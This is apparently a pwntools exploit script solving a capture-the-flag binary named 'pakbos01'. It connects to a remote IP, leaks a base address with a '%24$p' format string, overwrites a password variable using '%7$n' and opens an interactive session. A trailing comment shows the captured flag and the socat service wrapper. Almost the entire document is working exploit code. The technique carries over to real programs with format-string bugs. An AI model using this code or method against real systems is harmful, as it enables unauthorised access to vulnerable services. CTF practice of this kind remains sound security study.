from pwn import *
r = remote('3.0.19.78', 10001)
# r = process('./pakbos01')
print r.recvuntil('password: ')
r.sendline('%24$p')
base = int(r.recvuntil('?')[2:-1],16)
addr_pw = base+2103616
print 'Base = ' + hex(base)
print 'addr_pw = ' + hex(addr_pw)
r.recvuntil('password: ')
r.sendline('aaaa%7$n'+p64(addr_pw))
r.recvuntil('password: ')
r.sendline('\x04')
r.interactive()
r.close()


"""
$ cat fl* ru*
Arkav6{jennie_blackpink_gaksuka_pakbos}#!/bin/sh
socat -T10 tcp-l:10099,reuseaddr,fork exec:"timeout -s 9 10 ./pakbos01"
"""